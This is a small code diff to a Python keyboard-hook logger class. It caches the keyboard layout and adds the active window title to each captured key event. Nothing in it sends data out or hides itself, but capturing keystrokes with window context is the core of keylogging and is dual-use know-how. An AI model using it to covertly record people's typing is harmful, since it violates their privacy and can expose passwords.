@@ -3,7 +3,7 @@ from Loggers import *
 
 class KeyboardLogger(Logger):
     EVENTS = {0x100: "key down", 0x101: "key up", 0x104: "key down", 0x105: "key up"}
-    LAYOUT = user32.GetKeyboardLayout(0)
+    LAYOUT = hex(user32.GetKeyboardLayout(0) & (2 ** 16 - 1))
 
     def __init__(self, handler: any, quit_key: int = None):
         super(KeyboardLogger, self).__init__(LoggerEnum.KEYBOARD.value, quit_key)
@@ -31,9 +31,8 @@ class KeyboardLogger(Logger):
                         wParam == 260,  # is alt pressed
                         self.shift_pressed,  # is shift pressed
                         self._current_time(),  # current datetime
-
-                        hex(self.LAYOUT & (2 ** 16 - 1)),  # keyboard layout
-                        ...  # window title
+                        self.LAYOUT,  # keyboard layout
+                        self._get_active_window_title()  # window title
                     )
                 )
         else:
